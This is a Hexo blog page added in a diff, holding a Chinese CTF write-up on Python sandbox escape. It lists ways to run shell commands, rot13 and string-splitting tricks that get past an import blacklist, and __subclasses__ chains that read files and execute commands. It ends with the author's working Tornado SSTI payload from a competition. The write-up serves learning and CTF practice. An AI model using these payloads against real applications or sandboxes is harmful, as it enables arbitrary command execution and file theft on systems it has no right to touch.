@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,python," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="python 沙箱逃逸前两天打了国赛半决赛，很菜，有一道python tornado 的ssti差点就做出来了，很可惜。决定补一补python。">
+<meta name="keywords" content="CTF,python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱逃逸">
+<meta property="og:url" content="http://yoursite.com/2018/06/12/python沙箱逃逸/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="python 沙箱逃逸前两天打了国赛半决赛，很菜，有一道python tornado 的ssti差点就做出来了，很可惜。决定补一补python。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:updated_time" content="2018-06-11T18:43:55.742Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python沙箱逃逸">
+<meta name="twitter:description" content="python 沙箱逃逸前两天打了国赛半决赛，很菜，有一道python tornado 的ssti差点就做出来了，很可惜。决定补一补python。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/06/12/python沙箱逃逸/"/>
+
+
+
+
+
+  <title>python沙箱逃逸 | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">多渴望滴下为自由流的汗.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/12/python沙箱逃逸/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">python沙箱逃逸</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-06-12T02:29:54+08:00">
+                2018-06-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="python-沙箱逃逸"><a href="#python-沙箱逃逸" class="headerlink" title="python 沙箱逃逸"></a>python 沙箱逃逸</h2><p>前两天打了国赛半决赛，很菜，有一道python tornado 的ssti差点就做出来了，很可惜。决定补一补python。<br><a id="more"></a></p>
+<h3 id="一些调用shell命令的方法"><a href="#一些调用shell命令的方法" class="headerlink" title="一些调用shell命令的方法"></a>一些调用shell命令的方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,subprocess,commands,timeit</span><br><span class="line">os.system(<span class="string">'ifconfig'</span>)</span><br><span class="line">os.popen(<span class="string">'ifconfig'</span>)<span class="comment">#返回file read对象，需要用read()或者readlines()去读</span></span><br><span class="line">commands.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">subprocess.call([<span class="string">'cat /flag'</span>],shell=<span class="keyword">True</span>)</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('ifconfig'))"</span>,number=<span class="number">1</span>)<span class="comment">#这个模块中的timeit函数本来返回的是命令执行时间的，但是我们也可以利用它来执行任意命令</span></span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br><span class="line">map(os.system,[<span class="string">"ls /tmp"</span>])</span><br></pre></td></tr></table></figure>
+<h3 id="import相关的基础"><a href="#import相关的基础" class="headerlink" title="import相关的基础"></a>import相关的基础</h3><p>检测敏感包<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">'code.py'</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">'import\s+(os|commands|subprocess|sys)'</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"forbidden module import detected"</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure></p>
+<p>引入包的方式：<br><code>import</code>函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=__import__(<span class="string">'pbzznaqf'</span>.decode(<span class="string">'rot_13'</span>))<span class="comment">#pbzznaqf=&gt;rot13=&gt;commands</span></span><br><span class="line">a.getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>importlib库:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">a = importlib.import_module(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>)</span><br><span class="line"><span class="keyword">print</span> a.getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="import进阶"><a href="#import进阶" class="headerlink" title="import进阶"></a>import进阶</h3><p>python中，不用引入直接使用的内置函数称为builtin函数，随着<code>__builtin__</code>这一个module自动被引入到环境中(在python3.x 版本中,<strong>builtin</strong>变成了builtins,而且需要引入)<br>像open(),int(),chr()这些函数，相当于<code>__builtin__.open()</code>…<br>可以删掉：<code>del __builtin__.chr</code>，同理，可以删掉危险函数。<br><strong>builtin</strong>是默认引入的，而reload函数用于重新载入模块，只需<code>reload(__builtin__)</code>即可重新得到完整的<strong>builtin</strong>模块了<br>but,reload函数也是在<strong>builtin</strong>里面的，如果它也被删掉了，可以这么做：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure></p>
+<p>即可重新获得完整的<strong>builtin</strong>模块</p>
+<h3 id="dir-与dict"><a href="#dir-与dict" class="headerlink" title="dir()与dict"></a>dir()与<strong>dict</strong></h3><p>这两种方法在沙箱逃逸中都很有用，可以列出一个模组/类/对象下面 所有的属性和函数，<strong>dict</strong>是用来存储对象属性的一个字典，其键为属性名，值为属性的值</p>
+<h3 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h3><p>python的object类中集成了很多基础函数，创建object的方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br></pre></td></tr></table></figure></p>
+<p>创建object后，可以调用<strong>subclasses</strong>搞事情了:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'/flag'</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/flag'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/flag'</span>).read()</span><br><span class="line">[].__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/flag'</span>).read()</span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.system(<span class="string">'ls'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#以上语句，貌似开头的[]和()效果是一样的</span></span><br><span class="line"><span class="comment">#另外，不会这么舒服让你读的，要用到反射和__dict__去绕过</span></span><br></pre></td></tr></table></figure></p>
+<p>当访问某个对象的属性时，会无条件的调用<code>__getattribute__</code>这个方法。比如调用t.<strong>dict</strong>,其实执行了<code>t.__getattribute__(&quot;__dict__&quot;</code>)函数, 这个方法只适用于新式类。<br>新式类就是集成自object或者type的类。<br>上面有一句可以改写成：用<strong>dict</strong>还是<strong>getattribute</strong>得看调用者是什么类型<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__dict__[<span class="string">"__in"</span>+<span class="string">"it__"</span>].__getattribute__(<span class="string">"__glo"</span>+<span class="string">"bals__"</span>)[<span class="string">'os'</span>].system(<span class="string">'ls /tmp'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>在这里，贴一下前两天国赛web9的列目录的payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;getattr(getattr(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>],<span class="string">"__in"</span>+<span class="string">"it__"</span>),<span class="string">"func_glo"</span>+<span class="string">"bals"</span>)[<span class="string">"linecache"</span>].__dict__[<span class="string">"o"</span>+<span class="string">"s"</span>].__dict__[<span class="string">"sy"</span>+<span class="string">"stem"</span>](<span class="string">'ls /tmp'</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#dict和globals都是字典类型，用[]键值对访问，也可以通过values(),keys()这样的方法来转换成list,通过下标来访问</span></span><br><span class="line"><span class="comment">#func_globals是一个保存所有全局对象的字典，函数通过此字典查找其中所有用到的全局对象。</span></span><br><span class="line"><span class="comment">#注意，用system(ls /...)的话，在这题里只会显示最后一行。。迷</span></span><br><span class="line"><span class="comment">#这个可以列目录</span></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__dict__[<span class="string">"__in"</span>+<span class="string">"it__"</span>].__getattribute__(<span class="string">"__glo"</span>+<span class="string">"bals__"</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'ls /home/ciscn'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>{{}}的结构是SSTI，我会在另一篇文章中详细讲一下SSTI，然后，还用到了反射，因为后台代码有一个黑名单，用反射即可无视。在这里必须感谢一下广州外语外贸大学Pr0ph3t大佬的教导。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>比赛时，由于不知道怎么去列目录，一直在用读文件的命令去各种试，以为flag的文件就叫flag，读过/home/ciscn/flag，没有成功，后面到了fixit才知道，flag在/home/ciscn/flag.txt中，虽然很可惜，但是也没什么好说的，如果flag的文件名改得更刁钻一点，那我就更没办法了，只能怪自己还是太菜，技术不够。后面复现了一下，发现这题可以花式吊锤的。</p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://www.anquanke.com/post/id/107000" target="_blank" rel="noopener">https://www.anquanke.com/post/id/107000</a><br><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://www.cnblogs.com/Guido-admirers/p/6206212.html" target="_blank" rel="noopener">https://www.cnblogs.com/Guido-admirers/p/6206212.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/07/php/" rel="next" title="php伪协议之php://">
+                <i class="fa fa-chevron-left"></i> php伪协议之php://
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#python-沙箱逃逸"><span class="nav-number">1.</span> <span class="nav-text">python 沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一些调用shell命令的方法"><span class="nav-number">1.1.</span> <span class="nav-text">一些调用shell命令的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#import相关的基础"><span class="nav-number">1.2.</span> <span class="nav-text">import相关的基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#import进阶"><span class="nav-number">1.3.</span> <span class="nav-text">import进阶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dir-与dict"><span class="nav-number">1.4.</span> <span class="nav-text">dir()与dict</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内联函数"><span class="nav-number">1.5.</span> <span class="nav-text">内联函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">1.7.</span> <span class="nav-text">References</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
